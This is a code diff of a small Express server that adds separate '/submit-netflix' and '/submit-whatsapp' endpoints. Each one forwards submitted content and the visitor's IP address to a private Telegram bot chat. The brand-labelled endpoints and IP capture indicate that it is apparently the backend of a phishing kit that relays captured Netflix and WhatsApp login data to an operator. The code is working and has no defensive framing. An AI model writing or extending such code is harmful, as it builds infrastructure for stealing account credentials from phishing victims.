@@ -1,3 +1,4 @@
+const requestIp = require("request-ip");
 const express = require("express");
 const dotenv = require("dotenv");
 const axios = require("axios");
@@ -6,17 +7,38 @@ dotenv.config();
 
 const app = express();
 app.use(express.json());
+app.use(requestIp.mw());
 app.use(cors());
 
-app.post("/submit", (req, res) => {
+app.post("/submit-netflix", (req, res) => {
   const message = req.body.content;
 
   axios
     .post(
-      `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
+      `https://api.telegram.org/bot${process.env.NETFLIX_TELEGRAM_BOT_TOKEN}/sendMessage`,
       {
-        chat_id: process.env.TELEGRAM_CHAT_ID,
-        text: `Netflix\n\n${message}\nIP: ${req.ip}`,
+        chat_id: process.env.NETFLIX_TELEGRAM_CHAT_ID,
+        text: `Netflix\n\n${message}\nIP: ${req.clientIp}`,
+      }
+    )
+    .then(() => {
+      res.status(200).json({ success: true });
+    })
+    .catch((error) => {
+      console.error(error);
+      res.status(500).json({ success: false });
+    });
+});
+
+app.post("/submit-whatsapp", (req, res) => {
+  const message = req.body.content;
+
+  axios
+    .post(
+      `https://api.telegram.org/bot${process.env.WHATSAPP_TELEGRAM_BOT_TOKEN}/sendMessage`,
+      {
+        chat_id: process.env.WHATSAPP_TELEGRAM_CHAT_ID,
+        text: `WhatsApp\n\n${message}\nIP: ${req.clientIp}`,
       }
     )
     .then(() => {
